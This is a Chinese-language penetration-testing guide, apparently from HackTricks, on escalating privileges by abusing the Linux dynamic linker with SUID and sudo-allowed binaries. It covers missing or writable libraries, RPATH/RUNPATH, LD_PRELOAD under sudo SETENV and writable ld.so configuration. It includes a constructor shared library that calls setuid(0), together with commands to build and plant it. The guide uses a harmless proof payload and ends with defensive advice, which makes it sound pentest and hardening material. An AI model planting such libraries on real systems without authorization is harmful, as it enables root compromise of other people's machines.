# SUID Shared Library 和 Linker 滥用

{{#include ../../banners/hacktricks-training.md}}

通常会检查 SUID 二进制文件是否能直接执行命令，但自定义 SUID 程序也可能通过 dynamic linker 存在漏洞。常见情况很简单：特权可执行文件从低权限用户能够控制的路径或配置中加载代码。<sup>[[1]](#references)</sup>

本页重点介绍通用的技术模式：缺失的库、可写的库目录、`RPATH`/`RUNPATH`、通过 sudo 使用 `LD_PRELOAD`、linker 配置，以及 SUID hardlink 混淆。

有关这些检查背后的 ELF 程序头、动态段和 loader 行为，请参阅 [ELF basic information](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md)。

## 快速枚举

首先查找异常的 SUID 文件，并检查它们是否为动态链接：<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

对不熟悉的可执行文件使用 `readelf`：[`ldd` 可能会执行不可信的 ELF interpreter](https://man7.org/linux/man-pages/man1/ldd.1.html)。`readelf` 会显示直接依赖项，因此还要单独确认 loader 实际选择的路径。<sup>[[1]](#references)[[3]](#references)</sup>

重点检查非标准位置、自定义应用路径、由 root 拥有但位于包管理目录之外的二进制文件，以及从可写目录加载的依赖项。<sup>[[1]](#references)</sup>

有用的可写性检查：

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

一些自定义 SUID 二进制文件会尝试加载一个不存在的 shared object。如果缺失的路径位于攻击者控制的目录下，该二进制文件可能会以有效用户身份加载攻击者提供的代码。<sup>[[1]](#references)</sup>

同样的边界也适用于**允许通过 sudo 执行的自定义二进制文件**：如果它对位于调用者可写的 home 或配置目录下的绝对 `.so` 路径调用 `dlopen()`，就可能触发这种情况。这种延迟加载的库可能不会出现在 `ldd` 输出或 ELF `NEEDED` 条目中。对 `strings` 输出进行有限检查，或跟踪一次**非特权**调用，都可能揭示它尝试访问的路径；应用程序密码或菜单选项可能会决定是否查找该路径。在将其视为提权途径之前，请确认实际的 sudo 规则、确切路径及其父目录权限，以及特权调用是否会执行到该查找操作。不要仅为了枚举目标而调用 sudo。

使用 `strace` 的系统调用过滤器查找失败的库查找：<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

如果二进制文件会在可写路径中搜索 `libexample.so`，可以使用 constructor 编写一个最小化的 proof library。验证期间应确保 proof-of-impact 无害：<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

使用二进制文件尝试加载的确切文件名来构建它：

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

可被利用的条件并不只是缺少库。攻击者还必须能够在特权 loader 会接受的路径中放置兼容的 shared object。<sup>[[1]](#references)</sup>

## 可写的库目录

有时所有依赖项都存在，但用于解析这些依赖项的某个目录可写。这可能允许替换已加载的库，或植入一个同名且优先级更高的库。<sup>[[1]](#references)</sup>

同样的检查也适用于通过 **sudo 允许执行**的自定义 ELF，即使该 ELF 没有 SUID 位，且允许的 RunAs 账户不是 root。将其 `DT_NEEDED` 条目与 loader 将解析到的库路径进行比较；然后检查调用者能否写入该文件，或通过可写且可搜索的父目录替换它。确认准确的 sudo RunAs 规则、符号链接和 ACL、loader 策略，以及目标进程是否以更高权限账户加载该库。可写的 `.so` 或依赖项名称本身只能作为线索；检查元数据时不要运行 sudo 命令。<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

检查依赖路径：<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

如果目录可写，请在实验环境中使用不会影响原文件的方法进行验证。在运行中的主机上替换系统库，可能导致同时启动的进程使用不一致的库版本。<sup>[[8]](#references)</sup>

### chroot 内可写的库

仅使用 chroot 并不会关闭继承的文件描述符，也不会限制所有文件系统访问。如果沙箱留下了一个指向新根目录之外的目录描述符，而被监禁的进程可以解引用该描述符（例如通过可访问的 `/proc/<pid>/fd/` 条目），那么主机路径仍可能可访问。这属于文件系统边界问题；其本身不会授予 root 权限。<sup>[[11]](#references)[[12]](#references)</sup>

请单独检查：被监禁的用户是否能写入一个库目录，而从 jail 中启动的 **host root-SUID executable** 会使用该目录。loader 会根据进程的文件系统视图解析依赖，因此攻击者控制的库可能以 SUID 程序的有效身份执行。确认具体的 executable、其 SUID 位和挂载策略、目录描述符的目标及访问权限、jail 的库搜索路径，以及程序是否确实能访问 host executable。沙箱启动器上的文件 capability、可写的 jail 或 host SUID binary 单独来看都只是线索；完整的利用链取决于沙箱的实现。<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH 和 RUNPATH

`RPATH` 和 `RUNPATH` 是动态段条目，用于告知 loader 在哪里搜索库。如果它们指向攻击者可写的目录，就会对 SUID 程序构成风险。<sup>[[1]](#references)</sup>

检测它们：<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

示例危险输出：

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

如果 `/opt/app/lib` 可写，且该二进制需要 `libcustom.so`，攻击者可能能够在其中放置恶意的 `libcustom.so`：<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` 和 `RUNPATH` 在所有解析细节上并不完全相同，但在审查权限提升问题时，实际要问的是同一个问题：SUID 二进制文件是否会从攻击者可写的目录中搜索库名称？<sup>[[1]](#references)</sup>

## LD_PRELOAD、LD_LIBRARY_PATH 和 SUID

对于普通程序，`LD_PRELOAD` 和 `LD_LIBRARY_PATH` 可强制或影响共享对象的加载。对于 SUID 程序，动态加载器通常会进入安全执行模式，并忽略危险的环境变量。<sup>[[1]](#references)</sup>

这意味着，用户仅仅能够设置 `LD_PRELOAD`，通常不会使一个普通的 SUID 二进制文件易受攻击：<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

常见的例外是 sudo 策略允许为目标命令行设置环境变量，例如使用 `SETENV` 标签或适用的 `setenv` 选项。如果目标是动态链接的，且 sudo 接受 `LD_PRELOAD=/path/to/library`，目标就可能加载由调用者控制的代码。请检查生效的规则和目标身份。在动态加载器会于 SUID `sudo` 进程启动前剥除继承的 `LD_PRELOAD` 的系统上，仅将 `LD_PRELOAD` 添加到 `env_keep` 并不足够；命令行赋值是在 sudo 自身启动后由 sudo 处理的。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

不要混淆这些情况；上面的 loader 和 sudo policy 规则将它们区分开来：<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- 针对普通 SUID binary 使用 `LD_PRELOAD`：通常会被 secure execution 阻止。
- 将 `LD_PRELOAD` 作为 sudo 命令行赋值传给特权、动态链接的目标：可能可利用。
- 可写路径中缺少 `.so`：当 SUID binary 会正常加载该路径时，可能可利用。
- 指向可写目录的 `RPATH`/`RUNPATH`：当所需库可被控制时，可能可利用。
- 对 `/etc/ld.so.preload` 或 linker 配置文件具有写入权限：影响整个系统，危害很大。

## Linker Configuration

`ld.so` 使用 linker cache 和 `/etc/ld.so.preload`；`ldconfig` 根据 `/etc/ld.so.conf` 及其包含的文件构建该缓存，这些文件通常位于 `/etc/ld.so.conf.d/`。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

高价值检查：

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

可写的 linker 配置通常比单个存在漏洞的 SUID 二进制文件更严重，因为它可能影响许多动态链接的进程。`/etc/ld.so.preload` 尤其危险，因为它可以强制在特权进程中加载 shared object。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID 硬链接混淆

硬链接可以让同一个 SUID inode 以多个名称出现。<sup>[[9]](#references)</sup> 这有助于隐藏特权 helper、干扰清理工作，或绕过简单的基于路径的审查。

查找链接数大于 1 的 SUID 文件：<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

检查指向同一 inode 的所有路径：<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

滥用点不在于硬链接会改变权限，而在于路径混淆：特权 inode 可能通过防御人员或脚本意料之外的名称访问。<sup>[[9]](#references)</sup> 关于 inode 和硬链接工作流程的更多内容，请参阅 [文件系统、Inode 与恢复](../main-system-information/filesystem-inodes-and-recovery.md)。

## 防御说明

- 尽量保持 SUID 二进制文件精简、经过审计，并由软件包管理。
- 避免 `RPATH`/`RUNPATH` 条目指向可写目录或由应用程序管理的目录。<sup>[[1]](#references)[[8]](#references)</sup>
- 确保库目录由 root 所有，且普通用户不可写。<sup>[[8]](#references)</sup>
- 不要通过 sudo 保留 `LD_PRELOAD`、`LD_LIBRARY_PATH` 或类似的加载器变量。<sup>[[1]](#references)[[5]](#references)</sup>
- 监控 `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/` 以及意外出现的 SUID 文件。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- 检查具有硬链接的 SUID 文件，并调查标准系统路径之外的自定义 SUID 包装程序。<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf（GNU Binary Utilities）](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux 手册页](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [常见属性（GCC）](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [动态链接器强化（GNU C Library）](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [硬链接（GNU Findutils）](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump（GNU Binary Utilities）](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Linux 手册页](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
